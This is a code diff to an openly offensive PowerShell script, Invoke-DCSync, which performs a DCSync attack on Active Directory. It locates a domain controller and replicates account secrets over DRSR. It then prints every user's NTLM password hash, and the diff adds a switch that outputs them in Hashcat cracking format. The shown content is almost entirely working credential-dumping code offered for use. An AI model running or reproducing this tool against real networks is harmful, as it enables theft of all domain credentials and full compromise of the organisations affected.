@@ -5,14 +5,21 @@ function Invoke-DCSync
 		Stolen from https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-DCSync.ps1 and slightly modified to run for all accounts without providing DC and username info
         The above was stolen from https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1 and slightly modified to choose username and DC for the sync.
         License: BSD 3-Clause
+
+	.USAGE
+	Invoke-DCSync
+	Invoke-DCSync -Hashcat
+	Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local
     #>
 
     Param
     (
         [string]
-        $dcfqdn,
-        [string]
-        $username
+        $DomainController,
+		[string]
+        $Domain,
+		[switch]
+		$Hashcat
     )
 
 $sourceDrsr = @"
@@ -1473,20 +1480,30 @@ Add-Type -TypeDefinition $sourceDrsr
 
 $ErrorActionPreference = "SilentlyContinue"
 
-if(!$env:USERDNSDOMAIN){
-	try{
-		$RetrieveDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-		$RetrieveDomain = $RetrieveDomain.Name
+if(!$Domain){
+	$Domain = $env:USERDNSDOMAIN
+	if(!$Domain){
+		try{
+			$RetrieveDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+			$RetrieveDomain = $RetrieveDomain.Name
+		}
+		catch{$RetrieveDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
+		$Domain = $RetrieveDomain
 	}
-	catch{$RetrieveDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
-	$Domain = $RetrieveDomain
 }
-else{$Domain = $env:USERDNSDOMAIN}
 
-$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$Domain" 2>$null
+if(!$DomainController){
+		
+	$DomainController = $RetrieveDomain.RidRoleOwner.Name
+	
+	if(!$DomainController){
 
-# Filtering to find the line with 'svr hostname' and then split it to get the last part which is our DC name.
-$DomainController = ($result | Where-Object { $_ -like '*svr hostname*' } | Select-Object -First 1).Split('=')[-1].Trim()
+		$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$Domain" 2>$null
+
+		# Filtering to find the line with 'svr hostname' and then split it to get the last part which is our DC name.
+		$DomainController = ($result | Where-Object { $_ -like '*svr hostname*' } | Select-Object -First 1).Split('=')[-1].Trim()
+	}
+}
 
 $connection = Establish-LDAPSession -Domain $Domain -DomainController $DomainController
 
@@ -1510,8 +1527,8 @@ foreach($usr in $AllUsers){
 	$values = $drsr.GetData($usr)
 	$hash = $values["ATT_UNICODE_PWD"]
 	$hashprint = -join ($hash|  foreach {$_.ToString("X2") } )
-	#$FinalLine = $usr + "::" + "aad3b435b51404eeaad3b435b51404ee:" + $hashprint + ":::" # Hashcat format
-	$FinalLine = $usr + ":" + $hashprint
+	if($Hashcat){$FinalLine = $usr + "::" + "aad3b435b51404eeaad3b435b51404ee:" + $hashprint + ":::"}
+	else{$FinalLine = $usr + ":" + $hashprint}
 	Write-Output "$FinalLine"
 }
 }
@@ -1597,5 +1614,3 @@ function Establish-LDAPSession {
 
     return $ldapConnection
 }
-
-Invoke-DCSync
